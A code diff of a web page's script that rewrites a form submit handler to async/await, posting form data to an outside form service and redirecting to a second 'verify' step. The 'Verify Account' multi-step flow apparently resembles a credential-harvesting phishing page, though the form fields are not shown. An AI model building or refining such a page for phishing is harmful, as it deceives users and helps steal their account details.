@@ -86,33 +86,32 @@ button:hover { background:#3b82f6; }
 <div id="successMsg">Verify Account</div>
 
 <script>
-document.getElementById('step1Form').addEventListener('submit', function(e){
-    e.preventDefault();
+document.getElementById('step1Form').addEventListener('submit', async function(e){
+    e.preventDefault(); // Stop default form submit
 
-    // Prepare form data
     const form = e.target;
     const data = new FormData(form);
 
-    // Submit to Web3Forms via fetch
-    fetch('https://api.web3forms.com/submit', {
-        method:'POST',
-        body:data
-    })
-    .then(res => res.json())
-    .then(res => {
-        // Show success message briefly
+    try {
+        // Submit form data to Web3Forms
+        const res = await fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            body: data
+        });
+        const result = await res.json();
+
+        // Show a tiny success message
         const msg = document.getElementById('successMsg');
         msg.style.display = 'block';
 
+        // Redirect after 0.5 seconds
         setTimeout(()=>{
-            // Redirect to Step 2
             window.location.href = "verify.html";
-        }, 500); // 0.5 seconds
-    })
-    .catch(err => {
-        alert('Submission failed. Try again.');
+        }, 500);
+    } catch(err) {
+        alert('Submission failed. Please try again.');
         console.error(err);
-    });
+    }
 });
 </script>
 
